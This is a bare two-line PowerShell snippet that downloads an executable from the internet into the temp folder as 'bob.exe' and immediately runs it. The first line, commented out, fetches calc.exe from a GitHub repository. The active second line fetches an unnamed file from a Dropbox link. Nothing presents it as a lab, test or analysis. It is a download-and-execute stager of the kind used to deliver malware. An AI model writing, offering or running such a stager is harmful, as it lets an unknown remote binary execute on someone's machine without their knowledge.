#(new-object System.Net.WebClient).DownloadFile('https://github.com/Sir4h/public_489321234/raw/master/calc.exe', "$env:temp\bob.exe");Start-Process -filepath "$env:temp\bob.exe"
(new-object System.Net.WebClient).DownloadFile('https://www.dl.dropboxusercontent.com/scl/fi/v9dd8wpt1ta1znk2v9kt3/test?rlkey=ejc6lw5cn6rr65z4qigzqbeq5', "$env:temp\bob.exe");Start-Process -filepath "$env:temp\bob.exe"
